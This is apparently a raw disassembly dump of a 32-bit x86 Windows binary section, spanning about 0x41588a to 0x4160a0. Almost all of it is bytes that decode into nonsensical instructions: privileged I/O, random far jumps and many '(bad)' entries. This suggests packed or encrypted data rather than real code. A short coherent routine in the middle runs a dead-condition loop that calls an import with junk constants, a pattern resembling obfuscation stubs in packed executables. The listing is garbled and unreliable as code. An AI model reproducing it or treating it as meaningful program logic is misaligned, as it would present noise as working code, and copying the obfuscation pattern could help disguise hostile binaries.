  41588a:	add    BYTE PTR [edx+0x39a69291],dl
  415890:	icebp  
  415891:	pushf  
  415892:	add    DWORD PTR [ecx-0x10],esi
  415895:	fsub   QWORD PTR ds:0x8f69cb58
  41589b:	push   edi
  41589c:	mov    ebp,DWORD PTR [ebx-0x1d7b3058]
  4158a2:	push   edx
  4158a3:	xlat   BYTE PTR ds:[ebx]
  4158a4:	mul    esp
  4158a6:	cmp    esp,DWORD PTR [edi*4+0x48d446a6]
  4158ad:	mov    cl,0x8e
  4158af:	dec    ecx
  4158b0:	xor    DWORD PTR [esi+0x34514739],esi
  4158b6:	out    0x67,eax
  4158b8:	lds    esp,FWORD PTR cs:[esi+0x35]
  4158bc:	dec    edx
  4158bd:	xor    BYTE PTR [edi],ah
  4158bf:	push   0x68305c57
  4158c4:	push   0x7809ea9b
  4158c9:	mov    esp,?
  4158cb:	push   ebp
  4158cc:	jmp    0xc238717e
  4158d1:	rol    DWORD PTR [ebp-0x7c766551],1
  4158d7:	mov    bl,0xbb
  4158d9:	jo     0x41586b
  4158db:	cwde   
  4158dc:	cmp    al,0x53
  4158de:	sar    BYTE PTR [ebp-0x3641b006],1
  4158e4:	push   ecx
  4158e5:	pop    esp
  4158e6:	and    al,0x55
  4158e8:	sbb    al,0x4e
  4158ea:	mov    ds:0x11b4b409,al
  4158ef:	imul   ebx,DWORD PTR [eax-0x50809995],0xffffffcd
  4158f6:	mov    eax,0x2f553354
  4158fb:	psubusb mm6,QWORD PTR [eax]
  4158fe:	hlt    
  4158ff:	out    0x8b,eax
  415901:	cmp    eax,0xc8b497d8
  415906:	xchg   edi,eax
  415907:	jp     0x4158a0
  415909:	sbb    BYTE PTR [edi+ecx*8],dl
  41590c:	cmc    
  41590d:	cmc    
  41590e:	and    BYTE PTR [ecx+0x70],dl
  415911:	mov    ds,ecx
  415913:	cmp    dl,BYTE PTR [edi-0x79a9e4ca]
  415919:	call   0xbba5:0xfc7e2ba0
  415920:	sbb    al,0xbf
  415922:	pop    ebp
  415923:	inc    BYTE PTR [edx+0x31792eb2]
  415929:	lds    ebp,FWORD PTR [ebx]
  41592b:	adc    DWORD PTR ds:0xf42da5d6,ecx
  415931:	popf   
  415932:	stc    
  415933:	aaa    
  415934:	rcr    DWORD PTR [esi+ebp*2],1
  415937:	stc    
  415938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415939:	(bad)  
  41593a:	leave  
  41593b:	popa   
  41593c:	shl    BYTE PTR [eax+0x328783bb],cl
  415942:	mov    eax,0xf2f06502
  415947:	ja     0x415913
  415949:	add    BYTE PTR [eax-0x2508bbc9],al
  41594f:	sti    
  415950:	and    al,BYTE PTR [eax+0x667eef35]
  415956:	dec    edi
  415957:	xor    BYTE PTR [eax],dh
  415959:	push   ss
  41595a:	test   al,0xb7
  41595c:	stos   DWORD PTR es:[edi],eax
  41595d:	push   DWORD PTR [esi-0x1a544b83]
  415963:	xor    al,0x3
  415965:	mov    ds:0x15e9cd8,eax
  41596a:	add    DWORD PTR [esi],ebp
  41596c:	cdq    
  41596d:	cmp    eax,0x3be00b69
  415972:	ret    
  415973:	dec    esp
  415974:	and    DWORD PTR [eax],ebp
  415976:	ret    
  415977:	add    esp,DWORD PTR [edi+0x4536b659]
  41597d:	inc    ebp
  41597e:	sbb    dh,BYTE PTR [ebx-0x6d2e46e]
  415984:	aas    
  415985:	adc    DWORD PTR [edi+0x4c],eax
  415988:	fwait
  415989:	lds    esi,FWORD PTR [ebp+edx*1+0x75]
  41598d:	inc    ebp
  41598e:	out    dx,al
  41598f:	adc    eax,0x19a397e
  415994:	sar    BYTE PTR ds:0x864800ec,0x5
  41599b:	loopne 0x4159d0
  41599d:	out    dx,al
  41599e:	cmp    DWORD PTR [edi+ebx*1],0xa
  4159a2:	adc    al,BYTE PTR [esi-0x4f]
  4159a5:	and    DWORD PTR [ecx-0x696f8569],0xffffffdb
  4159ac:	bnd cs jns 0x41595c
  4159b0:	add    eax,0x2f9bf58c
  4159b5:	es inc ecx
  4159b7:	popf   
  4159b8:	push   es
  4159b9:	xor    DWORD PTR [eax],0xf04f283f
  4159bf:	push   esi
  4159c0:	popf   
  4159c1:	sbb    al,0x4b
  4159c3:	cmp    bh,BYTE PTR [edx*1+0x10718aae]
  4159ca:	nop    DWORD PTR [eax+0x5e]
  4159ce:	es xor al,0xd1
  4159d1:	and    al,0x20
  4159d3:	icebp  
  4159d4:	cmp    ebx,DWORD PTR [edi]
  4159d6:	inc    eax
  4159d7:	pop    ecx
  4159d8:	mov    edx,0x8a09d51
  4159dd:	fcmovnbe st,st(5)
  4159df:	xchg   BYTE PTR [esi],dl
  4159e1:	data16 add dl,bh
  4159e4:	loopne 0x4159fe
  4159e6:	ret    0xd4dd
  4159e9:	push   0xffffffe1
  4159eb:	xchg   ecx,esp
  4159ed:	fidivr WORD PTR [esi]
  4159ef:	mov    dh,0x6a
  4159f1:	icebp  
  4159f2:	pop    es
  4159f3:	ja     0x4159cd
  4159f5:	push   ds
  4159f6:	mov    bh,bh
  4159f8:	shr    ebx,cl
  4159fa:	mov    DWORD PTR [ebp-0x2ef5a694],eax
  415a00:	cmp    al,bh
  415a02:	mov    DWORD PTR [eax+0x52],ebp
  415a05:	es ret 0x5c59
  415a09:	xchg   esp,eax
  415a0a:	test   eax,0x2e637ce0
  415a0f:	inc    ecx
  415a10:	imul   ebx,esp,0x73
  415a13:	(bad)  
  415a14:	out    dx,al
  415a15:	arpl   WORD PTR [ebp+ecx*4-0x29],si
  415a19:	(bad)  
  415a1b:	scas   eax,DWORD PTR es:[edi]
  415a1c:	or     ebx,ecx
  415a1e:	xor    al,0xe0
  415a20:	outs   dx,BYTE PTR ds:[esi]
  415a21:	xchg   esp,eax
  415a22:	sub    al,0xb5
  415a24:	xchg   bl,bl
  415a26:	cwde   
  415a27:	sti    
  415a28:	jmp    0x665a:0x28ed5118
  415a2f:	sbb    ebp,DWORD PTR [ebx+ecx*2+0x734aabbe]
  415a36:	add    bl,BYTE PTR ds:0x77a96e3
  415a3c:	mov    edi,0x767ab8cb
  415a41:	and    eax,0x57e47a2b
  415a46:	mov    ch,0x79
  415a48:	jle    0x4159fd
  415a4a:	fwait
  415a4b:	push   ds
  415a4c:	retf   
  415a4d:	jo     0x415a01
  415a4f:	sub    eax,0x722942b0
  415a54:	jge    0x415a85
  415a56:	sub    eax,0xe91bcbc8
  415a5b:	add    ah,BYTE PTR [ebx+edi*2]
  415a5e:	fld    QWORD PTR [ebx]
  415a60:	add    dh,dh
  415a62:	adc    eax,DWORD PTR [ebx+0x3fb34256]
  415a68:	xor    dh,0x59
  415a6b:	push   ebx
  415a6c:	push   es
  415a6d:	aad    0xc4
  415a6f:	arpl   WORD PTR [ecx+ecx*2+0x4],si
  415a73:	iret   
  415a74:	mov    WORD PTR [ecx-0x62],?
  415a77:	pop    ds
  415a78:	dec    esp
  415a79:	call   0x7775:0xaf43cad3
  415a80:	or     eax,0x655ec2d8
  415a85:	pop    esi
  415a86:	push   cs
  415a87:	enter  0xa2b,0x78
  415a8b:	lods   al,BYTE PTR ds:[esi]
  415a8c:	jne    0x415a42
  415a8e:	push   es
  415a8f:	push   es
  415a90:	lds    eax,FWORD PTR [ecx+0x34]
  415a93:	jl     0x415b0c
  415a95:	sub    DWORD PTR [edi-0x35],esp
  415a98:	or     DWORD PTR ds:0x60746699,eax
  415a9e:	rol    esi,cl
  415aa0:	inc    ebp
  415aa1:	sbb    eax,0x3225dbf6
  415aa6:	inc    ecx
  415aa7:	sbb    eax,0x8888a322
  415aac:	ja     0x415a81
  415aae:	add    al,0xd5
  415ab0:	xor    di,WORD PTR [ecx-0x7e]
  415ab4:	loope  0x415b31
  415ab6:	jp     0x415abc
  415ab8:	push   eax
  415ab9:	mov    ebp,0xd72bfac4
  415abe:	mov    ds:0x1da21832,al
  415ac3:	es pop ebx
  415ac5:	mov    bh,0x28
  415ac7:	inc    eax
  415ac8:	push   ebp
  415ac9:	xor    ch,ch
  415acb:	push   edx
  415acc:	dec    ecx
  415acd:	push   esi
  415ace:	push   ds
  415acf:	aam    0xe9
  415ad1:	sti    
  415ad2:	test   al,0xf
  415ad4:	xchg   esp,eax
  415ad5:	jl     0x415a78
  415ad7:	push   es
  415ad8:	or     eax,0x3e350774
  415add:	pop    ecx
  415ade:	adc    BYTE PTR [edx+0x18b5f6ca],ch
  415ae4:	or     DWORD PTR [edi-0x2c],esp
  415ae7:	and    eax,0x52df6b3f
  415aec:	push   es
  415aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aee:	mov    ah,0x25
  415af0:	pop    ss
  415af1:	xchg   edi,eax
  415af2:	push   eax
  415af3:	and    eax,DWORD PTR [ecx]
  415af5:	scas   eax,DWORD PTR es:[edi]
  415af6:	inc    dh
  415af8:	outs   dx,BYTE PTR ds:[esi]
  415af9:	fild   QWORD PTR [eax]
  415afb:	es and al,0x49
  415afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aff:	loope  0x415ab2
  415b01:	repz pop ds
  415b03:	jb     0x415b64
  415b05:	mov    cs,WORD PTR [ebx+0x521f919e]
  415b0b:	neg    BYTE PTR [ebx-0x5e]
  415b0e:	ins    DWORD PTR es:[edi],dx
  415b0f:	mov    esi,0xaec1b422
  415b14:	xchg   edi,eax
  415b15:	fdivr  DWORD PTR [eax+ebp*8+0x4c1eee3]
  415b1c:	inc    esp
  415b1d:	or     al,BYTE PTR [eax+0x6c33b8f9]
  415b23:	dec    edx
  415b24:	popf   
  415b25:	fsubr  QWORD PTR [edx]
  415b27:	jo     0x415af4
  415b29:	dec    esp
  415b2a:	out    0xe7,eax
  415b2c:	(bad)  
  415b2d:	cdq    
  415b2e:	rol    cl,1
  415b30:	xchg   dh,bl
  415b32:	scas   eax,DWORD PTR es:[edi]
  415b33:	test   DWORD PTR ds:0x8b3c631f,ebp
  415b39:	push   ebp
  415b3a:	or     al,0x33
  415b3c:	(bad)  
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x262318bc
  415bea:	adc    esp,DWORD PTR [ebp+ecx*1+0x47]
  415bee:	popa   
  415bef:	bound  edx,QWORD PTR [edx+0x5f]
  415bf2:	bound  esp,QWORD PTR [edx-0x6f]
  415bf5:	ficom  WORD PTR [ebp-0x7d3ec3a1]
  415bfb:	ss mov edx,0x65f4174
  415c01:	pusha  
  415c02:	adc    esi,DWORD PTR [ecx]
  415c04:	xchg   esp,eax
  415c05:	cmp    eax,0xbfb05871
  415c0a:	mov    cl,0x76
  415c0c:	out    0xc5,eax
  415c0e:	xchg   esp,eax
  415c0f:	hlt    
  415c10:	scas   al,BYTE PTR es:[edi]
  415c11:	xchg   ebx,eax
  415c12:	or     al,0xe7
  415c14:	aam    0x96
  415c16:	repz jo 0x415c47
  415c19:	add    DWORD PTR [edx+eiz*8],esi
  415c1c:	mov    ch,0x4
  415c1e:	mov    ebx,0x9d403b52
  415c23:	scas   eax,DWORD PTR es:[edi]
  415c24:	cdq    
  415c25:	scas   eax,DWORD PTR es:[edi]
  415c26:	in     eax,0xe9
  415c28:	repz adc dl,ah
  415c2b:	jmp    0x415c80
  415c2d:	xchg   edi,eax
  415c2e:	dec    eax
  415c2f:	fistp  QWORD PTR [ebx-0xb1bbc97]
  415c35:	inc    ebx
  415c36:	ret    0xa941
  415c39:	popf   
  415c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c3b:	cmp    ah,BYTE PTR [ecx-0x46]
  415c3e:	cmc    
  415c3f:	cmp    eax,0xdb2600af
  415c44:	and    BYTE PTR [ebp+ebx*1+0x3e3b79da],0xf
  415c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4d:	or     dl,dl
  415c4f:	arpl   WORD PTR [ebp+0x4091eee],sp
  415c55:	fidiv  DWORD PTR [ebp+0x2b02c7c5]
  415c5b:	js     0x415c03
  415c5d:	pop    esp
  415c5e:	dec    ebx
  415c5f:	and    al,0xd2
  415c61:	jnp    0x415c9d
  415c63:	int    0xc4
  415c65:	sbb    eax,0xf52eff01
  415c6a:	inc    DWORD PTR [ecx]
  415c6c:	rcr    DWORD PTR [ebp+ebp*8-0x1c18c6fc],cl
  415c73:	push   ss
  415c74:	outs   dx,DWORD PTR ds:[esi]
  415c75:	mov    bh,0x13
  415c78:	mul    DWORD PTR [ebx+0x46224fc]
  415c7e:	not    BYTE PTR [edx-0x2d487674]
  415c84:	push   ds
  415c85:	sub    al,0x10
  415c87:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415c89:	xor    BYTE PTR [ecx+edx*1-0x33039c8b],ah
  415c90:	dec    esi
  415c91:	out    0x17,eax
  415c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c94:	jecxz  0x415cbd
  415c96:	shl    bh,0x67
  415c99:	retf   0xe8e
  415c9c:	adc    DWORD PTR [edx-0x3e2a1331],ecx
  415ca2:	(bad)  
  415ca3:	or     al,0x22
  415ca5:	add    al,0x2c
  415ca7:	fistp  WORD PTR [di-0x7492]
  415cac:	cmp    ecx,DWORD PTR [ebp+ebx*8+0x22]
  415cb0:	ret    0xf72c
  415cb3:	adc    edi,esi
  415cb5:	push   ecx
  415cb6:	push   0xf8610fe3
  415cbb:	stos   DWORD PTR es:[edi],eax
  415cbc:	inc    eax
  415cbd:	cmp    ebp,esp
  415cbf:	push   ds
  415cc0:	hlt    
  415cc1:	rol    DWORD PTR [edx],1
  415cc3:	sub    al,0xe8
  415cc5:	xchg   esp,eax
  415cc6:	sub    al,BYTE PTR [ebp+0x44972d33]
  415ccc:	cli    
  415ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cce:	push   ds
  415ccf:	push   ds
  415cd0:	mov    cl,0xa4
  415cd2:	fdiv   QWORD PTR [edx]
  415cd4:	mov    edx,0x72b650ce
  415cd9:	adc    al,0xc7
  415cdb:	or     al,ch
  415cdd:	outs   dx,DWORD PTR ds:[esi]
  415cde:	push   cs
  415cdf:	stc    
  415ce0:	xor    ch,BYTE PTR [ebx]
  415ce2:	stos   DWORD PTR es:[edi],eax
  415ce3:	mov    cl,BYTE PTR [esi]
  415ce5:	fdivr  QWORD PTR [edi+esi*2+0x3c]
  415ce9:	sub    bh,BYTE PTR [eax]
  415ceb:	pop    edx
  415cec:	push   0xd
  415cee:	(bad)  [eax-0x1]
  415cf1:	(bad)  
  415cf2:	push   ss
  415cf3:	add    ebx,DWORD PTR ds:0xdd487a26
  415cf9:	sub    edi,ebp
  415cfb:	push   esi
  415cfc:	adc    esi,ecx
  415cfe:	clc    
  415cff:	sub    DWORD PTR [ebx+0x3a],edx
  415d02:	daa    
  415d03:	xor    ch,BYTE PTR [eax]
  415d05:	cmp    eax,0xedfb16df
  415d0a:	push   0xb5c805ba
  415d0f:	ins    BYTE PTR es:[edi],dx
  415d10:	xor    al,0x80
  415d12:	dec    ebx
  415d13:	lahf   
  415d14:	into   
  415d15:	or     edx,DWORD PTR [eax]
  415d17:	sub    DWORD PTR [edi-0x5a],0x501d073e
  415d1e:	sbb    DWORD PTR [ecx],ecx
  415d20:	inc    esi
  415d21:	adc    edx,esi
  415d23:	jb     0x415d08
  415d25:	inc    dx
  415d27:	or     BYTE PTR [edi],ch
  415d29:	mov    al,0x6
  415d2b:	jne    0x415d57
  415d2d:	add    BYTE PTR [edi+0x68],0xe
  415d31:	mov    DWORD PTR [esi+0x11],ebx
  415d34:	sub    al,0xe8
  415d36:	push   0xdcd072a2
  415d3b:	mov    eax,ds:0x251367a3
  415d40:	shl    BYTE PTR [ebp+0x24],0xb1
  415d44:	inc    edi
  415d45:	mov    ebx,0x455a10c5
  415d4a:	mov    cl,0xc2
  415d4c:	mov    ebx,0x55b157e5
  415d51:	les    edx,FWORD PTR [ecx+0x5d]
  415d54:	cmp    DWORD PTR es:[ecx],esp
  415d57:	addr16 jp 0x415db2
  415d5a:	mov    esp,DWORD PTR ds:0xb16879e3
  415d60:	(bad)  
  415d61:	push   cs
  415d62:	imul   esp,DWORD PTR [eax+0x24]
  415d66:	xor    dh,BYTE PTR [ebp-0x4a795b2]
  415d6c:	jecxz  0x415d2b
  415d6e:	mov    al,0x29
  415d70:	ins    BYTE PTR es:[edi],dx
  415d71:	push   eax
  415d72:	sbb    al,0x75
  415d74:	test   eax,0x4e995709
  415d79:	jnp    0x415dd0
  415d7b:	mov    ds:0x647eb4ae,al
  415d80:	js     0x415dba
  415d82:	xor    eax,0xbbbdc0e
  415d87:	test   BYTE PTR [ecx+0x4f],cl
  415d8a:	sub    DWORD PTR [ecx+0x40dc37e3],0x2c62220a
  415d94:	jae    0x415d17
  415d96:	cmp    al,0x98
  415d98:	ret    0x8b1d
  415d9b:	mov    cl,0x4c
  415d9d:	push   ecx
  415d9e:	mov    al,0xf
  415da0:	nop
  415da1:	loop   0x415d3a
  415da3:	or     ch,0x15
  415da6:	int3   
  415da7:	mov    ch,0xf5
  415da9:	enter  0x197d,0x9e
  415dad:	add    eax,0x4eb71c29
  415db2:	(bad)  
  415db3:	hlt    
  415db4:	mov    bl,0x73
  415db6:	pop    es
  415db7:	adc    eax,0xab4a8a12
  415dbc:	stos   DWORD PTR es:[edi],eax
  415dbd:	adc    dh,BYTE PTR [eax+0x7]
  415dc0:	cmp    dl,BYTE PTR [eax-0x5f9b91c7]
  415dc6:	jae    0x415db8
  415dc8:	xchg   bl,dh
  415dca:	jmp    DWORD PTR [esi]
  415dcc:	out    0x65,al
  415dce:	fwait
  415dcf:	jmp    0x415e47
  415dd1:	pop    esi
  415dd2:	add    al,0xc5
  415dd4:	push   0xf
  415dd6:	dec    ecx
  415dd7:	xchg   edx,eax
  415dd8:	mov    ch,0x74
  415dda:	and    al,0xe7
  415ddc:	cmc    
  415ddd:	retf   0xfac6
  415de0:	push   ebx
  415de1:	aaa    
  415de2:	adc    DWORD PTR [edi],ebx
  415de4:	sbb    ah,BYTE PTR [eax+ebx*1-0x15c1a5a1]
  415deb:	lahf   
  415dec:	xor    al,0xec
  415dee:	bt     DWORD PTR [edi+edx*8+0x730d393a],esp
  415df6:	pushf  
  415df7:	jge    0x415e4f
  415df9:	(bad)  
  415dfa:	mov    esp,0xc5387a9e
  415dff:	xor    bh,cl
  415e01:	inc    ecx
  415e02:	repz adc cl,BYTE PTR [ecx+0x6b]
  415e06:	dec    esi
  415e07:	cmp    eax,0xb11d32b6
  415e0c:	push   cs
  415e0d:	(bad)  
  415e0f:	jae    0x415dbc
  415e11:	lock stos DWORD PTR es:[edi],eax
  415e13:	jmp    0xed09:0x3198b935
  415e1a:	adc    eax,0xccdd73d
  415e1f:	stc    
  415e20:	int    0x58
  415e22:	les    esi,FWORD PTR [edx-0x5c]
  415e25:	imul   ebp,DWORD PTR [ebp-0x3e],0x2c
  415e29:	imul   esp,DWORD PTR ss:[eax+0x69764769],0x74
  415e31:	sbb    DWORD PTR [ecx+eiz*8-0x37b469fa],esi
  415e38:	xor    ecx,DWORD PTR [edi-0x57]
  415e3b:	mov    ecx,0xb7e47e87
  415e40:	fidivr DWORD PTR [esi+0x5c]
  415e43:	or     ah,BYTE PTR [edx-0x25b91abb]
  415e49:	pusha  
  415e4a:	mov    ebx,0xec7ba8b5
  415e4f:	lods   al,BYTE PTR ds:[esi]
  415e50:	jp     0x415e11
  415e52:	ss iret 
  415e54:	std    
  415e55:	test   edi,ebx
  415e57:	sbb    edi,0x9761aeb9
  415e5d:	arpl   WORD PTR [esi-0x3eaa433d],di
  415e63:	out    0x94,al
  415e65:	pop    ebx
  415e66:	jmp    0xee19b186
  415e6b:	add    al,0xc6
  415e6d:	es dec esi
  415e6f:	dec    esp
  415e70:	sub    edx,DWORD PTR [ebp*4+0x70543fd]
  415e77:	pop    eax
  415e78:	ins    BYTE PTR es:[edi],dx
  415e79:	adc    eax,0x9b189c77
  415e7e:	add    BYTE PTR gs:[ebp+0x49609273],0x21
  415e86:	aam    0x83
  415e88:	outs   dx,DWORD PTR ds:[esi]
  415e89:	jae    0x415ebd
  415e8b:	mov    BYTE PTR [ebx-0x1f2b4906],cl
  415e91:	mov    ah,0x82
  415e93:	(bad)  
  415e94:	cmp    edx,DWORD PTR [edx+0x6d]
  415e97:	jge    0x415ed9
  415e99:	ficom  WORD PTR [ebp+0x61]
  415e9c:	pusha  
  415e9d:	xchg   ebp,eax
  415e9e:	sub    al,BYTE PTR [eax-0x354908d1]
  415ea4:	daa    
  415ea5:	cmp    edi,DWORD PTR [ecx+0x48]
  415ea8:	and    DWORD PTR [edx],ecx
  415eaa:	xchg   ecx,eax
  415eab:	out    dx,al
  415eac:	cs cld 
  415eae:	jg     0x415f07
  415eb0:	(bad)  
  415eb1:	and    eax,0xdd21bec0
  415eb6:	cwde   
  415eb7:	callw  0x584
  415ebb:	cmp    BYTE PTR [ebp+0x3],ah
  415ebe:	mov    al,ds:0x5a7c066f
  415ec3:	push   ebp
  415ec4:	gs xchg esp,eax
  415ec6:	mov    eax,ds:0xfc687207
  415ecb:	ins    BYTE PTR es:[edi],dx
  415ecc:	lock mov eax,ds:0xa7e5eab4
  415ed2:	fs xor eax,0xdc3db3b8
  415ed8:	shr    ah,0xb2
  415edb:	sbb    eax,ebp
  415edd:	xchg   ebp,eax
  415ede:	fcom   QWORD PTR [esi-0x60a30c86]
  415ee5:	bnd jo 0x415f13
  415ee8:	and    esp,edx
  415eea:	jecxz  0x415f22
  415eec:	mov    esp,0x8b2c66e1
  415ef1:	ret    0x6a1c
  415ef4:	inc    ebp
  415ef5:	and    eax,0x37465128
  415efa:	inc    esi
  415efb:	lock mov ecx,0x1b974999
  415f01:	outs   dx,BYTE PTR ds:[esi]
  415f02:	out    dx,al
  415f03:	push   eax
  415f04:	lods   eax,DWORD PTR ds:[esi]
  415f05:	test   DWORD PTR [edx],esp
  415f07:	maxps  xmm3,xmm1
  415f0a:	jne    0x415ea1
  415f0c:	jge    0x415eef
  415f0e:	xor    bl,dh
  415f10:	adc    ch,BYTE PTR ds:0x84981b1d
  415f16:	dec    edi
  415f17:	mov    al,ds:0x5825db1d
  415f1c:	je     0x415f37
  415f1e:	cvttps2pi mm5,QWORD PTR [edi+eiz*2-0x63]
  415f23:	or     BYTE PTR [edi+0x2e],0x7a
  415f27:	aam    0x9f
  415f29:	and    esp,DWORD PTR [edi]
  415f2b:	adc    bh,dl
  415f2d:	sub    al,0x27
  415f2f:	jg     0x415efb
  415f31:	mov    ds,ebx
  415f33:	iret   
  415f34:	push   edi
  415f35:	mov    al,BYTE PTR [edi]
  415f37:	data16 jb 0x415f83
  415f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f3b:	ficom  WORD PTR [ebp-0x11]
  415f3e:	mov    ebp,0xef1ee00a
  415f43:	cmp    edx,DWORD PTR [ebp-0x71d003a3]
  415f49:	cli    
  415f4a:	popa   
  415f4b:	or     DWORD PTR [edx+0x4cfdd36b],ebp
  415f51:	outs   dx,BYTE PTR ds:[esi]
  415f52:	cli    
  415f53:	cmp    al,0xd7
  415f55:	jle    0x415efd
  415f57:	xchg   ebx,eax
  415f58:	xor    al,0x51
  415f5a:	out    0x6c,al
  415f5c:	into   
  415f5d:	push   cs
  415f5e:	inc    edi
  415f5f:	imul   eax,eax,0xffffffad
  415f62:	sahf   
  415f63:	adc    bl,BYTE PTR [edx+0x663b8711]
  415f69:	int    0xca
  415f6b:	jne    0x415f14
  415f6d:	pop    edi
  415f6e:	inc    ebx
  415f6f:	enter  0x259b,0x2d
  415f73:	lea    ebp,[edi+0x6c47246]
  415f79:	and    al,0x8a
  415f7b:	rol    BYTE PTR [edx+0x5e1d588b],1
  415f81:	lds    ecx,FWORD PTR [edx+0x5d]
  415f84:	sahf   
  415f85:	pop    es
  415f86:	push   esp
  415f87:	push   ss
  415f88:	mov    edx,0x7ccd2b03
  415f8d:	js     0x415f40
  415f8f:	xchg   BYTE PTR [edx-0x46],al
  415f92:	xchg   esi,eax
  415f93:	pusha  
  415f94:	mov    edx,0xd503a681
  415f99:	add    edx,DWORD PTR [ecx]
  415f9b:	jns    0x416015
  415f9d:	xchg   esp,eax
  415f9e:	jmp    0x11c7:0x7489f59d
  415fa5:	push   0xffffffce
  415fa7:	ror    dh,0xe7
  415faa:	mov    esi,0x1a2d2462
  415faf:	aas    
  415fb0:	and    al,0x57
  415fb2:	(bad)  
  415fb3:	ins    DWORD PTR es:[edi],dx
  415fb4:	dec    ecx
  415fb5:	mov    al,0x46
  415fb7:	push   0xfffffff9
  415fb9:	sbb    eax,0x92a35bd8
  415fbe:	mov    edx,ebp
  415fc0:	inc    edx
  415fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fc2:	add    al,0xcb
  415fc4:	jmp    0xe23a:0xe2b30a74
  415fcb:	xor    bl,BYTE PTR [ebx+edi*8+0x7d]
  415fcf:	int3   
  415fd0:	(bad)  
  415fd2:	pusha  
  415fd3:	mov    ch,0x69
  415fd5:	fstp   DWORD PTR [esi-0x7eb5c3fc]
  415fdb:	jmp    0x9787df8c
  415fe0:	nop
  415fe1:	mov    eax,ds:0xda4785a6
  415fe6:	and    esi,DWORD PTR [ebx]
  415fe8:	mov    dl,0xcc
  415fea:	stc    
  415feb:	cld    
  415fec:	loope  0x415fcd
  415fee:	call   0x6ef50f2e
  415ff3:	xor    al,0xa2
  415ff5:	cmp    al,0xd0
  415ff7:	adc    edi,edi
  415ff9:	sbb    edx,DWORD PTR [ecx]
  415ffb:	in     al,0xf5
  415ffd:	push   cs
  415ffe:	jl     0x416022
  416000:	add    ebp,ecx
  416002:	sbb    al,0xc7
  416004:	or     bh,BYTE PTR [esi+edx*1-0x17]
  416008:	ja     0x415fc4
  41600a:	je     0x415fa0
  41600c:	push   0xffffffe6
  41600e:	sbb    BYTE PTR [edx-0xa],dl
  416011:	push   ds
  416012:	adc    BYTE PTR [esi+0x62],dh
  416015:	scas   eax,DWORD PTR es:[edi]
  416016:	mov    al,0x9e
  416018:	and    dl,bl
  41601a:	fsub   st(0),st
  41601c:	icebp  
  41601d:	div    dl
  41601f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416020:	sbb    BYTE PTR [ebx+0x38],dl
  416023:	pop    ebx
  416024:	or     BYTE PTR [ebx+ebx*8],ch
  416027:	icebp  
  416028:	xchg   edi,eax
  416029:	rol    ah,cl
  41602b:	dec    edx
  41602c:	(bad)  
  41602d:	popf   
  41602e:	add    esp,ebx
  416030:	inc    edi
  416031:	mov    ebp,0xf8919366
  416036:	inc    ebx
  416037:	call   0x879d:0xddea1c72
  41603e:	xor    al,0x49
  416040:	sti    
  416041:	inc    eax
  416042:	mov    ebp,0xda0bb67b
  416047:	cmp    ebp,DWORD PTR [esi+eax*8+0x43745b5f]
  41604e:	jle    0x4160ad
  416050:	or     BYTE PTR [ebp-0x398f4c52],cl
  416056:	cld    
  416057:	add    edx,DWORD PTR [ecx+0x40fc10d7]
  41605d:	rcl    edx,cl
  41605f:	pusha  
  416060:	repz fdivr DWORD PTR [ecx]
  416063:	call   0xa42c:0x46c6aa70
  41606a:	jb     0x416057
  41606c:	mov    ah,0x8f
  41606e:	mov    dl,BYTE PTR [ecx-0x61]
  416071:	mov    cl,0x1a
  416073:	mov    dh,0x1f
  416075:	dec    ebx
  416076:	arpl   WORD PTR [ecx+0x2cf40770],bp
  41607c:	xchg   edx,eax
  41607d:	xchg   edi,eax
  41607e:	lods   eax,DWORD PTR ds:[esi]
  41607f:	and    ebp,DWORD PTR [ecx]
  416081:	fnstcw WORD PTR [ebx+0x67]
  416084:	pop    esi
  416085:	fwait
  416086:	retf   
  416087:	cmp    eax,0x50890ba6
  41608c:	(bad)  
  41608d:	or     BYTE PTR gs:[eax+0x54],bl
  416091:	ins    BYTE PTR es:[edi],dx
  416092:	lea    esp,[esp+edx*2+0x47]
  416096:	neg    BYTE PTR [ecx-0x5]
  416099:	popa   
  41609a:	lea    ebp,[edi]
  41609c:	dec    edi
  41609d:	xchg   esi,eax
  41609e:	xor    BYTE PTR [eax],cl
  4160a0:	aad    0xf2
